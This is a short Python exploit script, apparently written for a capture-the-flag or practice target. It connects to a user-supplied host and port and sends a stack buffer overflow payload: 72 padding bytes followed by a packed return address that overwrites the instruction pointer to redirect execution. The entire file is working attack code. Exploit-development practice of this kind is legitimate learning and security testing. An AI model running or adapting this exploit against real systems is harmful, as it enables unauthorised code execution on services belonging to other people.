#!/usr/bin/env python3


import socket
import argparse
#converts the hex registry to little endian value
import struct

parser = argparse.ArgumentParser()

parser.add_argument(
	"host",
	type=str,
	help="This is the hostname or ip address to connect to")
parser.add_argument(
	"port",
	type=int,
	help="This is the port to connect to")

args = parser.parse_args()

offset = 72
#new extended instruction pointer
new_eip = struct.pack("<I", 0x40123b)

payload = [
	b"A"*offset,
	new_eip, #e-register reference instruction pointer

]

#convert the payload to bytes from list

payload = b"".join(payload)

payload += b"\n"

with socket.socket() as connection:

	connection.connect((args.host, args.port))
	print(connection.recv(4096).decode("utf-8"))
	connection.send(payload)
	print(connection.recv(4096).decode("utf-8"))